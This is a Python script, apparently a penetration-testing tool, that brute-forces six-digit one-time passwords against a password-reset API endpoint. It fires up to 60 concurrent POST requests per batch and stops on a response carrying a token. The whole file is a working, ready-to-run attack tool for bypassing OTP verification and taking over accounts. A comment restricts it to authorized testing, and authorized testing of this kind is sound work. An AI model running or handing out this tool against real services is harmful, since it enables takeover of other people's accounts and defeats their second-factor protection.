import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from queue import Queue
import threading
import argparse

# ⚠️ This tool is for authorized penetration testing only.
# Do not use against systems you don't have explicit permission to test.

def parse_args():
    parser = argparse.ArgumentParser(description="OTP Brute-force Testing Tool")
    parser.add_argument("--url", required=True, help="Target API endpoint")
    parser.add_argument("--mobile", required=True, help="Mobile number")
    parser.add_argument("--password", required=True, help="Password")
    parser.add_argument("--start", type=int, default=0, help="OTP start range")
    parser.add_argument("--end", type=int, default=999999, help="OTP end range")
    parser.add_argument("--workers", type=int, default=60, help="Concurrent threads")
    parser.add_argument("--batch-size", type=int, default=200, help="Batch size")
    parser.add_argument("--delay", type=float, default=0.05, help="Delay between batches")
    return parser.parse_args()

result_queue = Queue()
stop_event = threading.Event()

def try_otp(url, headers, mobile_number, password, otp_code):
    if stop_event.is_set():
        return None
    payload = {
        "mobile_number": mobile_number,
        "otp": otp_code,
        "password": password,
        "repeat_password": password
    }
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=5)
        status = response.status_code

        if status == 200 and "token" in response.text:
            result_queue.put(("success", otp_code, response.json()))
            stop_event.set()
            return True
        elif status == 429:
            result_queue.put(("rate_limit", otp_code, None))
            return False
        elif status == 400:
            result_queue.put(("bad_request", otp_code, None))
            return False
        else:
            result_queue.put(("other", otp_code, status))
            return False

    except requests.RequestException as e:
        result_queue.put(("error", otp_code, str(e)))
        return False

def main():
    args = parse_args()

    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }

    otp_range = range(args.start, args.end + 1)
    batch = []

    with ThreadPoolExecutor(max_workers=args.workers) as executor:
        for otp in otp_range:
            if stop_event.is_set():
                break

            otp_code = f"{otp:06d}"
            batch.append(otp_code)

            if len(batch) >= args.batch_size or otp == args.end:
                futures = [
                    executor.submit(try_otp, args.url, headers, args.mobile, args.password, code)
                    for code in batch
                ]

                for future in as_completed(futures):
                    if stop_event.is_set():
                        break
                    result = result_queue.get()
                    status, otp_code, data = result

                    if status == "success":
                        print(f"[+] ✅ Valid OTP found: {otp_code}")
                        print(f"Response: {data}")
                        return
                    elif status == "rate_limit":
                        print(f"[!] ⛔ Rate limited on OTP {otp_code}")
                    elif status == "bad_request":
                        print(f"[-] ❌ {otp_code} — Bad request (400)")
                    elif status == "error":
                        print(f"[!] Error for OTP {otp_code}: {data}")
                    else:
                        print(f"[i] {otp_code} — Status: {data}")

                batch = []
                time.sleep(args.delay)

if __name__ == "__main__":
    main()
